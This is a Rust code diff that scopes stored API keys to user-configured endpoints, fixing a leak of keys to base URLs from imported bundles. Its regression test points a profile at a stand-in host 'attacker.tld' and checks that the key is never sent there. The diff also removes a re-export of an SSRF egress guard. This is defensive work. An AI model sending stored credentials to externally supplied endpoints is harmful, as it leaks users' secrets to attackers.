@@ -27,9 +27,6 @@ mod tools;
 
 pub use config::{is_remote_http_provider, DEFAULT_BASE_URL, DEFAULT_MODEL};
 pub use secrets::{clear_qwen_api_key, qwen_key_configured, store_qwen_api_key};
-/// SSRF egress guard, reused by other engine modules (e.g. the Zapier deploy
-/// path) that POST to an externally-supplied URL.
-pub(crate) use tools::is_blocked_ip;
 
 use std::sync::atomic::AtomicBool;
 use std::sync::Arc;
@@ -54,22 +51,11 @@ pub async fn run_http_execution(
     start_time: Instant,
 ) -> ExecutionResult {
     let provider = model_profile.provider.as_deref().unwrap_or("qwen");
-    let model = model_profile.model.as_deref().unwrap_or(DEFAULT_MODEL).to_string();
-
-    let api_key = match secrets::resolve_api_key(model_profile) {
-        Some(k) => k,
-        None => {
-            return events::fail(
-                emitter,
-                execution_id,
-                &format!(
-                    "No API key for remote provider '{provider}'. Set it in the keyring \
-                     (qwen-api-key) or QWEN_API_KEY/DASHSCOPE_API_KEY."
-                ),
-                start_time,
-            );
-        }
-    };
+    let model = model_profile
+        .model
+        .as_deref()
+        .unwrap_or(DEFAULT_MODEL)
+        .to_string();
 
     let base_url = model_profile
         .base_url
@@ -79,16 +65,48 @@ pub async fn run_http_execution(
         .trim_end_matches('/')
         .to_string();
 
+    // Key resolution is endpoint-scoped: `base_url` owns the scheme and the
+    // authority of every request below, and it is not always the user's (it is
+    // copied verbatim out of imported bundles and adopted templates). See
+    // `secrets::stored_key_allowed_for`.
+    let api_key = match secrets::resolve_api_key(model_profile, &base_url) {
+        Ok(k) => k,
+        Err(reason) => {
+            return events::fail(
+                emitter,
+                execution_id,
+                &format!("Remote provider '{provider}': {reason}"),
+                start_time,
+            );
+        }
+    };
+
     tracing::info!(execution_id, provider, model, persona = persona_name, %base_url, tools_enabled, "[http_engine] starting remote inference");
 
     if tools_enabled {
         tools::run_tool_loop(
-            emitter, execution_id, provider, &model, &base_url, &api_key, prompt_text, cancelled, start_time,
+            emitter,
+            execution_id,
+            provider,
+            &model,
+            &base_url,
+            &api_key,
+            prompt_text,
+            cancelled,
+            start_time,
         )
         .await
     } else {
         openai::run_streaming(
-            emitter, execution_id, provider, &model, &base_url, &api_key, prompt_text, cancelled, start_time,
+            emitter,
+            execution_id,
+            provider,
+            &model,
+            &base_url,
+            &api_key,
+            prompt_text,
+            cancelled,
+            start_time,
         )
         .await
     }
@@ -114,6 +132,128 @@ mod tests {
         }
     }
 
+    /// **The regression test for the Vuln-3 fix.**
+    ///
+    /// A local inference server (Ollama / LM Studio / vLLM) at a loopback
+    /// `base_url` the user configured, with the API key coming from the keyring
+    /// or the environment rather than the profile, must still execute
+    /// end-to-end. This is the case an SSRF-safe resolver or a
+    /// `validate_url_safety` pre-flight would have broken — which is why the
+    /// Vuln-3 fix is credential-scoping, not URL-blocking.
+    #[tokio::test]
+    async fn loopback_byom_endpoint_still_executes() {
+        // A stored (non-profile) key, so this exercises the keyring/env branch.
+        std::env::set_var("QWEN_API_KEY", "sk-local-dev");
+
+        let (addr, _srv) = fake_openai_server().await;
+        let profile = ModelProfile {
+            model: Some("local-model".to_string()),
+            provider: Some("qwen".to_string()),
+            base_url: Some(format!("http://127.0.0.1:{}/v1", addr.port())),
+            auth_token: None,
+            prompt_cache_policy: None,
+            effort: None,
+        };
+
+        let emitter = NoOpEmitter::new();
+        let cancelled = Arc::new(AtomicBool::new(false));
+        let result = run_http_execution(
+            &emitter,
+            "local-byom-exec",
+            "Local BYOM",
+            &profile,
+            "ping",
+            false,
+            &cancelled,
+            Instant::now(),
+        )
+        .await;
+
+        assert!(
+            result.success,
+            "a user-configured loopback BYOM endpoint must still work; got: {:?}",
+            result.error
+        );
+        assert_eq!(result.output.as_deref(), Some("PONG"));
+    }
+
+    /// The mirror: the SAME profile pointed at a host the user never configured
+    /// must NOT get the stored key, and must fail before any request is made.
+    #[tokio::test]
+    async fn imported_foreign_endpoint_never_receives_the_stored_key() {
+        std::env::set_var("QWEN_API_KEY", "sk-local-dev");
+
+        let profile = ModelProfile {
+            model: Some("qwen3-max".to_string()),
+            provider: Some("qwen".to_string()),
+            // What an imported bundle / adopted template can set today.
+            base_url: Some("https://attacker.tld/v1".to_string()),
+            auth_token: None,
+            prompt_cache_policy: None,
+            effort: None,
+        };
+
+        let emitter = NoOpEmitter::new();
+        let cancelled = Arc::new(AtomicBool::new(false));
+        let result = run_http_execution(
+            &emitter,
+            "foreign-endpoint-exec",
+            "Imported",
+            &profile,
+            "the entire assembled prompt, team memory and goals",
+            false,
+            &cancelled,
+            Instant::now(),
+        )
+        .await;
+
+        assert!(!result.success, "must refuse, not execute");
+        let err = result.error.unwrap_or_default();
+        // The specific phrase matters: PRE-FIX this call also failed, but with
+        // "Cannot reach qwen at https://attacker.tld/... : dns error" — i.e. it
+        // failed only because the attacker's host happened not to resolve on
+        // this box, AFTER building a request carrying the user's real key. An
+        // assertion on the hostname alone would have passed against the bug.
+        assert!(
+            err.contains("Refusing to send the stored provider API key"),
+            "must refuse before building the request; got: {err}"
+        );
+        assert!(err.contains("attacker.tld"), "{err}");
+        assert!(
+            !err.contains("sk-local-dev"),
+            "must not echo the key: {err}"
+        );
+    }
+
+    /// Minimal OpenAI-compatible SSE endpoint on loopback: one content delta
+    /// ("PONG") then `[DONE]`. One task, connections served sequentially, and
+    /// the handle is bound rather than detached.
+    async fn fake_openai_server() -> (std::net::SocketAddr, tokio::task::JoinHandle<()>) {
+        use tokio::io::{AsyncReadExt, AsyncWriteExt};
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
+            .await
+            .expect("bind");
+        let addr = listener.local_addr().expect("addr");
+        let handle = tokio::spawn(async move {
+            loop {
+                let Ok((mut sock, _)) = listener.accept().await else {
+                    return;
+                };
+                let mut buf = [0u8; 4096];
+                let _ = sock.read(&mut buf).await;
+                let body =
+                    "data: {\"choices\":[{\"delta\":{\"content\":\"PONG\"}}]}\n\ndata: [DONE]\n\n";
+                let resp = format!(
+                    "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
+                    body.len()
+                );
+                let _ = sock.write_all(resp.as_bytes()).await;
+                let _ = sock.flush().await;
+            }
+        });
+        (addr, handle)
+    }
+
     /// Live text round-trip. Ignored by default (needs a key + network):
     ///   QWEN_API_KEY=... cargo test --features desktop --lib http_engine -- --ignored
     #[tokio::test]
@@ -132,8 +272,15 @@ mod tests {
             Instant::now(),
         )
         .await;
-        assert!(result.success, "expected success, got error: {:?}", result.error);
-        assert!(!result.output.unwrap_or_default().trim().is_empty(), "expected non-empty output");
+        assert!(
+            result.success,
+            "expected success, got error: {:?}",
+            result.error
+        );
+        assert!(
+            !result.output.unwrap_or_default().trim().is_empty(),
+            "expected non-empty output"
+        );
     }
 
     /// Live tool-calling loop: the model must call the built-in `get_current_time`.
@@ -153,8 +300,15 @@ mod tests {
             Instant::now(),
         )
         .await;
-        assert!(result.success, "expected success, got error: {:?}", result.error);
-        assert!(!result.output.unwrap_or_default().trim().is_empty(), "expected non-empty output");
+        assert!(
+            result.success,
+            "expected success, got error: {:?}",
+            result.error
+        );
+        assert!(
+            !result.output.unwrap_or_default().trim().is_empty(),
+            "expected non-empty output"
+        );
     }
 
     /// Capturing emitter so the MCP test can assert which tool actually fired.
@@ -163,7 +317,9 @@ mod tests {
     }
     impl CapturingEmitter {
         fn new() -> Self {
-            Self { events: std::sync::Mutex::new(Vec::new()) }
+            Self {
+                events: std::sync::Mutex::new(Vec::new()),
+            }
         }
         fn output_lines(&self) -> Vec<String> {
             self.events
@@ -176,7 +332,10 @@ mod tests {
     }
     impl ExecutionEventEmitter for CapturingEmitter {
         fn emit_json(&self, event: &str, payload: serde_json::Value) {
-            self.events.lock().unwrap().push((event.to_string(), payload));
+            self.events
+                .lock()
+                .unwrap()
+                .push((event.to_string(), payload));
         }
     }
 
@@ -199,8 +358,16 @@ mod tests {
         )
         .await;
         let lines = cap.output_lines();
-        eprintln!("[live_qwen_mcp_tool] success={} output:\n{}", result.success, lines.join("\n"));
-        assert!(result.success, "expected success, got error: {:?}", result.error);
+        eprintln!(
+            "[live_qwen_mcp_tool] success={} output:\n{}",
+            result.success,
+            lines.join("\n")
+        );
+        assert!(
+            result.success,
+            "expected success, got error: {:?}",
+            result.error
+        );
         assert!(
             lines.iter().any(|l| l.contains("personas_health")),
             "expected a personas_health tool call to fire; got lines: {lines:?}"
